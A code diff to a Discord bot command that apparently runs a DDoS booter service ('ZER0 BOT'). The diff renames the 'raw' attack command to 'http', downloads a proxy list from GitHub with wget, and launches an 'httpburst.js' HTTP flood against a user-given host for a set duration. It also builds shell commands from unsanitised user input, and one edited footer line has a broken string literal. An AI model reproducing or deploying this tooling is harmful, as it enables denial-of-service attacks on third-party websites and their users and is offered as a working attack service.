@@ -16,7 +16,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;raw https://example.com/ 60`")
+	.setDescription("`Ex ;http https://example.com/ 60`")
 	.setFooter("Please do not attack government website!")
 	message.channel.send(embed1);
 	return;
@@ -24,7 +24,11 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf.js ${host} ${duration}`, (error, stdout, stderr) => {
+exec(`rm proxies.txt`, (error, stdout, stderr) => {
+});
+exec(`wget https://raw.githubusercontent.com/apaple/Proxy/main/proxies.txt`, (error, stdout, stderr) => {
+});
+exec(`node httpburst.js ${host} proxies.txt ${duration} GET`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -36,7 +40,7 @@ const embed = new Discord.MessageEmbed()
 	.setTitle('🚀 **ZER0 BOT** 🚀')
 	.setTimestamp()
   .setDescription("**𝓟𝓵𝓪𝓷**: `VIP 👨` \n **𝓣𝓪𝓻𝓰𝓮𝓽** : `" + host + "` \n **𝓜𝓮𝓽𝓱𝓸𝓭** : `HTTP-RAW 💣` \n **𝓣𝓲𝓶𝓮** : `" + duration + "`")
-	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
+	.setFooter('© Developer: yukai, client.user.avatarURL)
 	.setTimestamp()
 	.setImage(attackgif)
 	.setThumbnail("")
@@ -58,7 +62,7 @@ const embed = new Discord.MessageEmbed()
 	.setTitle('🚀 **ZER0 BOT** 🚀')
 	.setTimestamp()
 	.setDescription("**► 𝓟𝓵𝓮𝓪𝓼𝓮 𝔀𝓪𝓲𝓽 𝓯𝓸𝓻 𝓿𝓮𝓻𝓲𝓯𝓲𝓬𝓪𝓽𝓲𝓸𝓷 **")
-	.setFooter('© Developer: zxcr9999#1770', client.user.avatarURL)
+	.setFooter('© Developer: yukai', client.user.avatarURL)
 	.setTimestamp()
 	.setImage(loadinggif)
 	.setThumbnail("")
@@ -69,12 +73,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['raw'],
+  aliases: ['http'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'raw',
-  description: 'zxcr9999',
-  usage: 'raw'
+  name: 'http',
+  description: 'yukai',
+  usage: 'http'
 }
